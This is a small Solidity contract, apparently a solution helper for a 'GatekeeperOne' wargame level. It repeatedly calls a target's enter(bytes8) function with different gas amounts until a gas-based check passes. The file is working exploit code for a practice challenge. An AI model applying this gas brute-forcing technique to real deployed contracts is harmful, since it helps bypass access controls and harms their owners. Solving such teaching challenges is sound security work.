// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GateKeeperOneHelper {
    function delegate(address gateAddr, bytes8 param) public {
        for(uint i=0;i<8191;i++) {
            (bool success,) = gateAddr.call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", param));
            if(success) {
                return;
            }
        }
        
    }
}